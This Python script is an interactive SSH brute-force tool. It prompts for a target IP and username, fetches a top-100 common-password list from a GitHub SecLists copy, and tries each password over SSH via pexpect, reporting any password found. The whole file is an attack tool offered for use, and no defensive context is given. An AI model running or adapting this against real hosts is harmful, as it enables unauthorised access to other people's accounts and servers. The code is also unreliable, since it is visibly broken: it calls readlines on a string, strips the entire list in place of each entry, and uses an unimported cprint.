#!/usr/bin/python3

from urllib.request import urlopen
import pexpect
import os
from termcolor import colored

PROMPT = ['# ', '>>> ', '> ', '\$ ']

passlist = str(urlopen("https://raw.githubusercontent.com/dreamer1eh/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt").read(), 'utf-8')

def connect(user,host,password):
        ssh_newkey = ("Are you sure you want to continue connecting: ")
        connStr = ('ssh ' + user + '@' + host)
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
        if ret==0:
                print('[-] Error Connecting')
                return
        if ret==1:
                child.sendline('yes')
                ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
                if ret==0:
                        print('[-] Error Connecting')
                        return
        child.sendline(password)
        child.expect(PROMPT, timeout=0.1)
        return child

def main():
	host= input(colored("|> Enter IP Address Of Target To Bruteforce: ","green",attrs=['bold']))
	user = input(colored("|> Enter User Account You Want To Bruteforce: ","yellow", attrs=['bold']))
	#file = open('password.txt', 'r')
	
	for password in passlist.readlines():
		password = passlist.strip('\n')
		try:
			child = connect(user, host, password)
			print(colored("[+] Password Found ⇒ {}".format(password),"green",attrs=["bold"]))
		except:
			print(colored("[-] Wrong Password X {}".format(password),"red"))
	
	#for password in file.readlines():
	#	password = password.strip('\n')
	#	try:
	#		child = connect(user, host, password)
	#		print(colored("[+] Password Found ⇒ {}".format(password),"green",attrs=["bold"]))
	#	except:
	#		print(colored("[-] Wrong Password X {}".format(password),"red"))
	menu() 
			
def menu():
	option = int(input(colored("\n\n=> Do you want to:\n[1] Bruteforce Again\n[2] Go Back\n[3] Main Menu\n[4] Exit\n\n>>>Select Your Choice: ",'yellow',attrs=["bold"])))
	if option == 1:
		os.system('python3 bruteforcessh.py && cd ..')

	elif option == 2:
		os.system('python3 loginwithssh.py && cd ..')

	elif option == 3:
		os.system('cd .. && python3 omnitrix.py')

	elif option == 4:
		os.system('echo "Good Bye! Have A Great Day . . ."|lolcat -a -i -d 50 -F 0.5')
		exit()
	else:
		cprint("\n[!] Error! Select Correct Option","red", attrs=['bold','blink'])
		#print(colored("\n[!!!] Error! Select Correct Option","red")) 
		input(colored("{#} Press Key To Continue . . .","green"))
		os.system("clear")
		menu()

os.system("clear")
os.system("figlet -f Cybermedium 'SSH Bruteforcer' | lolcat")
os.system('echo "\t\t╔───────────────────────────────────────╗" | lolcat -a -d 1')
os.system('echo "\t\t|       Created By: Rajnish Kumar       |" | lolcat -a -d 1')
os.system('echo "\t\t┖───────────────────────────────────────┙" | lolcat -a -d 1')
main()
